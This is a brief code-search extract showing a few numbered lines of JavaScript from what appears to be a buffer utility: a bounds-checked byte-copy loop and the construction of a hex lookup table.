Line 4054: {
    if ((i + offset >= dst.length) || (i >= src.length)) break
    dst[i + offset] = src[i]
  }
Line 4056: dst[i + offset] = src[i]
Line 4081: {
      table[i16 + j] = alphabet[i] + alphabet[j]
    }
Line 4082: table[i16 + j] = alphabet[i] + alphabet[j]
